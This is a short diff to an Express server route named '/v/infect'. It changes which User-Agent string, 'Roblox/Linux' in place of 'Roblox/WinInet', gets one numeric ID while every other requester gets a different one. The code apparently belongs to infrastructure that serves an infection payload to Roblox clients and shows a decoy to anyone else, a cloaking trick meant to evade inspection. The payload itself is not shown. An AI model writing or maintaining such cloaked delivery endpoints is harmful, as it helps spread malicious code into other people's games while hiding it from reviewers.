@@ -3,7 +3,7 @@ var app = express();
 app.get('/v/infect', async (req,res) => {
   const agent = req.headers['user-agent'];
   console.log(agent)
-  if (agent !== "Roblox/WinInet") {
+  if (agent !== "Roblox/Linux") {
     return res.json({infect:17858917701})
   };
   return res.json({infeect:779029809257501})
